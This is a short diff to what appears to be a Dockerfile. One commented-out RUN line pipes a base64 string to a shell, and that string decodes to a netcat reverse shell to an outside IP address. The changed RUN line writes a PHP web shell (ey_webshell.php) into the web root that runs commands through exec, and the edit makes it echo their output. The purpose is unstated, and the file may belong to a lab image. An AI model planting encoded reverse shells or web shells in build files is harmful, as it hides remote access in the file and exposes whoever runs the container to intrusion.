@@ -10,4 +10,4 @@ RUN echo "=========="
 #RUN apt install nmap -y
 #RUN echo "bmMgODkuOTAuMzkuNTQgOTA5MCAtZSBzaA==" | base64 -d | sh -i
 RUN echo "=========="
-RUN echo "<?php exec('ls');?>" > /var/www/html/ey_webshell.php
+RUN echo "<?php echo exec('ls');?>" > /var/www/html/ey_webshell.php
